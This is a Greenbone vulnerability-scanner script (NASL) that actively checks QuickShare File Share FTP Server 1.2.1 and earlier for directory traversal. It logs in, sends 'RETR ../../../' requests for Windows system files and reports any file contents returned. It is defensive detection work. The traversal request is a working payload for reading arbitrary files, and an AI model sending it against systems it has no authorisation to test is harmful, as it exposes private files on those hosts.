# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800197");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("QuickShare File Share FTP Server < 1.2.2 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/quickshare/file_share/detected", "Host/runs_windows");

  script_tag(name:"summary", value:"QuickShare File Share FTP Server is prone to a directory
  traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted FTP request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests
  containing 'dot dot' sequences (..) and back slashes in URL, which can be exploited to download
  arbitrary files from the host system via directory traversal attack.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"QuickShare File Share version 1.2.1 and prior.");

  script_tag(name:"solution", value:"Update to version 1.2.2 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16105/");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/9927");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98137/quicksharefs-traverse.txt");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = ftp_get_port( default:21 );
banner = ftp_get_banner( port:port );

if( ! banner || "220 quickshare ftpd" >!< tolower( banner ) )
  exit( 0 );

soc1 = open_sock_tcp( port );
if( ! soc1 )
  exit( 0 );

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in( socket:soc1, user:user, pass:pass );
if( ! login_details ) {
  ftp_close( socket:soc1 );
  exit( 0 );
}

port2 = ftp_get_pasv_port( socket:soc1 );
if( ! port2 ) {
  ftp_close( socket:soc1 );
  exit( 0 );
}

soc2 = open_sock_tcp( port2, transport:get_port_transport( port ) );
if( ! soc2 ) {
  ftp_close( socket:soc1 );
  exit( 0 );
}

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  req = "RETR ../../../../../../../../" + file;
  send( socket:soc1, data:string( req, "\r\n" ) );

  res = ftp_recv_data( socket:soc2 );

  if( res && match = egrep( string:res, pattern:pattern, icase:TRUE ) ) {
    ftp_close( socket:soc1 );
    close( soc2 );
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

ftp_close( socket:soc1 );
close( soc2 );

exit( 0 );
